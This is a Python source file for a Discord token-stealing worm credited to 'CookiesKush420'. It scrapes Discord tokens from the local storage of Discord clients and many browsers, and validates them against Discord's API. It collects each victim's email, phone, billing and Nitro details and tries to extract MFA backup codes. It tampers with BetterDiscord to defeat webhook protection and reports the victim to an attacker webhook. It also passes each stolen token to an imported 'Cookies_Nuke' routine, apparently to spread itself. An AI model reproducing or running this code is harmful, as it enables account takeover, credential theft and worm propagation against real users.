import requests
import os
import shutil
import json
from worm import Cookies_Nuke
from re import findall

class Cookies_Discord_Worm:
    def __init__(self):
        self.webhook = "WEBHOOK_HERE"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Cookies_Discord_Worm"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.discord_psw = []
        self.backup_codes = []
        

        self.grabTokens()
        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
            if os.path.exists(self.tempfolder+os.sep+i):
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
                    x = f.read()
                    if x != "":
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("Made by CookiesKush420\n\n")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x)
                            fp.write("\n\nMade by CookiesKush420")
                    else:
                        f.close()
                        try:
                            os.remove(self.tempfolder+os.sep+i)
                        except Exception:
                            print("ok")

        #self.SendInfo()
        self.SendMessage()
        try:
            shutil.rmtree(self.tempfolder)
        except (PermissionError, FileNotFoundError):
            pass

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def bypass_better_discord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "CookiesTheGoat")
        with open(bd, 'w'): pass
        with open(bd, "wt", encoding="cp437") as f:
            f.write(content2)


    def grabTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            try:
                                r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
                            except Exception:
                                pass
                            j = r.json()
                            if r.status_code == 200:
                                if token in self.tokens:
                                    continue
                                self.tokens.append(token)

                                user = j["username"] + "#" + str(j["discriminator"])

                                if token.startswith("mfa.") and self.discord_psw:
                                    with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
                                        fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
                                        for x in self.discord_psw:
                                            try:
                                                r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
                                                for i in r["backup_codes"]:
                                                    if i not in self.backup_codes:
                                                        self.backup_codes.append(i)
                                                        fp.write(f'\t{i["code"]} | {"Already used" if i["consumed"] == True else "Not used"}\n')
                                            except Exception:
                                                pass

                                badges = ""
                                flags = j['flags']
                                if (flags == 1): badges += "Staff, "
                                if (flags == 2): badges += "Partner, "
                                if (flags == 4): badges += "Hypesquad Event, "
                                if (flags == 8): badges += "Green Bughunter, "
                                if (flags == 64): badges += "Hypesquad Bravery, "
                                if (flags == 128): badges += "HypeSquad Brillance, "
                                if (flags == 256): badges += "HypeSquad Balance, "
                                if (flags == 512): badges += "Early Supporter, "
                                if (flags == 16384): badges += "Gold BugHunter, "
                                if (flags == 131072): badges += "Verified Bot Developer, "
                                if (badges == ""): badges = "None"

                                user = j["username"] + "#" + str(j["discriminator"])
                                email = j["email"]
                                phone = j["phone"] if j["phone"] else "No Phone Number attached"

                                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                                has_nitro = False
                                has_nitro = bool(len(nitro_data) > 0)

                                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                                f.write(f"\n\nMade By CookiesKush420#3617 | cookiesservices.xyz\n")
                                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n-------------------------------------------------")
                                message_Content = 'MESSAGE_HERE'
                                Cookies_Nuke(message_Content, token) 
        f.close()



    def SendMessage(self):
        backslash = "\n"
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/933468203831681064/939280014233444472/Pfp.gif",
            "embeds": [
                {
                    "author": {
                        "name": "CookiesKush420#3617",
                        "url": "http://cookiesservices.xyz",
                        "icon_url": "https://cdn.discordapp.com/attachments/933468203831681064/939280014233444472/Pfp.gif"
                    },
                    "description": f'**{os.getlogin()}** Just ran Cookies Discord Worm\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}```',
                    "color": 16119101,  

                    "footer": {
                      "text": "CookiesKush420#3617 |  cookiesservices.xyz"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=embed)


if __name__ == "__main__":
    Cookies_Discord_Worm()